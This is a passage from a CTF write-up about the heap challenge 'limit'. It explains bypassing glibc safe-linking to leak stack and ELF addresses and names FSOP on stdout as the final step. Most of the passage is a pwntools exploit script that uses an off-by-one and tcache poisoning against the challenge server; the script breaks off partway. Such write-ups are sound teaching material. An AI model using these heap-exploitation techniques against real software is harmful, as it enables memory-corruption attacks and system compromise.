<p>Now, when we <strong>sneak in a raw stack pointer</strong> (i.e., un-obfuscated) into the chunk&rsquo;s <code>fd</code>, glibc tries to <strong>de-obfuscate it anyway</strong>, thinking it’s legit tcache data. This gives us a <strong>corrupted value</strong>, but since we control the inputs, we can <strong>reverse this de-obfuscation manually</strong> to recover the <strong>original stack pointer</strong>.</p>
<p>Once we’ve got a valid <strong>stack leak</strong>, it becomes trivial to locate a return address or saved register on the stack that points back into the <strong>ELF binary</strong> — allowing us to <strong>leak the ELF base address</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="c1">######### leaking stack and elf address ##########</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">libc_argv</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2046e0</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_offset</span> <span class="o">=</span> <span class="mh">0x7ffe1ebbf2a8</span><span class="o">-</span> <span class="mh">0x7ffe1ebbf258</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;libc_argv = &#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_argv</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_argv</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span>  <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">libc_argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;stack_leak = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">stack_leak</span><span class="o">-</span><span class="n">stack_offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span>  <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">stack_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x60ea2433c000</span> <span class="o">-</span> <span class="mh">0x60ea2433d160</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;elf.address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 class="heading-element" id="final-blow"><span>Final Blow</span>
  <a href="#final-blow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Now we have everything we need — all the leaks and one of the most powerful exploitation primitives in hand: <strong>arbitrary read and write</strong>.</p>
<p><em>At this point, getting shell access is just a matter of time.</em></p>
<img src="http://localhost:1313/d1ff/images_limit/blow.gif" width="300" style="display: block; margin: auto;"  />
<!-- ![blow.gif](/d1ff/images_limit/blow.gif) -->
<p>There are tons of solid techniques you can pull off from here, especially with <strong>arb read/write</strong> on <strong>last libc versions</strong>. One particularly <strong>awesome list</strong> of such methods is this <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md"target="_blank" rel="external nofollow noopener noreferrer">document by nobodyisnobody</a> — definitely worth a read.</p>
<p>As for me, I went with a classic: <strong>FSOP (File Stream Oriented Programming)</strong> via a corrupted <code>stdout</code> structure and a call to <code>puts()</code>. Clean and effective. 🔪</p>
<h3 class="heading-element" id="exploitation-script"><span>Exploitation Script</span>
  <a href="#exploitation-script" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./limit_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="c1"># r = process()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;smiley.cat&#39;</span><span class="p">,</span> <span class="s1">&#39;39321&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">defuscate</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">l</span><span class="o">=</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">):</span> <span class="c1"># 16 nibble</span>
</span></span><span class="line"><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">+</span><span class="mi">12</span> <span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="o">+</span><span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">|=</span> <span class="p">(</span><span class="n">v1</span> <span class="o">^</span> <span class="n">v2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">obfuscate</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">adr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">^</span><span class="p">(</span><span class="n">adr</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Size:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_into</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(r,gdbscript=&#39;b *main+1273&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">defuscate</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x562c4dace000</span> <span class="o">-</span><span class="mh">0x562c4dace2a0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;heap_base = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x726908600000</span> <span class="o">-</span> <span class="mh">0x726908803c10</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc.address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="o">-</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">######################################### off-by-one #############################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x38</span><span class="p">)</span>  <span class="c1">#### a</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xca0</span>
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span> <span class="c1">#### b</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span> <span class="c1">#### c</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>  <span class="c1">################## seperate from top_chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">target</span><span class="p">)[:</span><span class="mi">7</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># create(14,0x28)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># view(14)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################################33</span>
</span></span><span class="line"><span class="cl">              <span class="c1">######### leaking stack and elf address ##########</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_argv</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2046e0</span>
